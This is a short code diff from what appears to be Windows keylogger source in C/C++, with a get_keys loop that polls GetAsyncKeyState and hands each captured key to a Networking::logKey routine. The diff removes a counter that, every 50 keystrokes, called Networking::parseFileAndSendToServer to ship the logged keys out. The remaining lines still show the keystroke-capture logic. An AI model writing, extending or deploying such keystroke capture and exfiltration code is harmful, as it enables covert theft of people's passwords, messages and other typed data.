@@ -26,7 +26,6 @@ int logger(void)
 int get_keys(void)
 {
 	short character;
-	int keyStrokes = 0;
 	while (1)
 	{
 		Sleep(10);/*to prevent 100% cpu usage*/
@@ -34,11 +33,6 @@ int get_keys(void)
 		{
 			if (GetAsyncKeyState(character) == -32767)
 			{
-				keyStrokes++;
-				if (keyStrokes % 50 == 0) {
-					// Blocking network call.
-					Networking::parseFileAndSendToServer();
-				}
 				if ((character >= 39) && (character <= 64))
 				{
 					Networking::logKey(character);
